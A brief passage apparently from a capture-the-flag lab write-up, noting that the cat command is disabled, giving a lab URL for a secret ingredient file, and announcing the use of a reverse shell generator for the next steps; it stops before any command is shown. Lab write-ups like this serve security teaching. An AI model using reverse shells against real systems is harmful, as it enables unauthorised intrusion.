...
We have cat command disabled but we can access http://10.67.128.80/Sup3rS3cretPickl3Ingred.txt. Fort the next 2 ingredients, I am using Reverse Shell Generator:
